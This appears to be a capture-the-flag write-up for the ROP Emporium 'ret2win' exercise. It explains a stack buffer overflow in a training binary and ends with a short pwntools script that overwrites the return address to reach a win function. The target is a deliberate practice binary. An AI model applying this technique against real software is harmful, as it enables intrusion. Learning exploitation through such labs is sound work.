# ROP Emporium
- [ret2win](#ret2win)

-----

## ret2win

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/394f9b8d-489e-48a1-819e-ff87397f8dae)

Theres a ret2win function that I need to run.

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/0cbae7df-b2a5-4578-a13a-2e55b6aa32ac)

Main function points to a pwnme function.

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/f4a4e38f-8ce3-45f7-9662-52b900f285ff)

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/08ef5d62-47f0-454d-951c-be9af458bf84)

Ok, there is a buffer overflow here, since it reads in 56 bytes into a 32 byte buffer.

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/e3ba53c3-1cfd-4533-9299-f4bc31701719)

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/3634127f-9c01-4ced-811a-043d44fe02d4)

So, I have to put in 32 bytes of anything with the address of ret2win.

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/f79629cf-a910-4697-9e1b-8f61936ca1e4)

But it does not work, because need to overwrite the RBP also, thats another 8 bytes buffer added.

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/2268c03e-635b-466a-abda-1191fca008b4)

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/17b4da86-cafa-44d9-b6e0-b42287cebf68)

I got the flag (I am not sure why the program is not cat-ing out the flag prob something with the permissions).

Solution:

```py
from pwn import *

p = process('./ret2win')
p.recv()

buffer  = b"A"*40
ret2win = p64(0x0000000000400756)

p.sendline(buffer + ret2win)
print(p.recv())
```
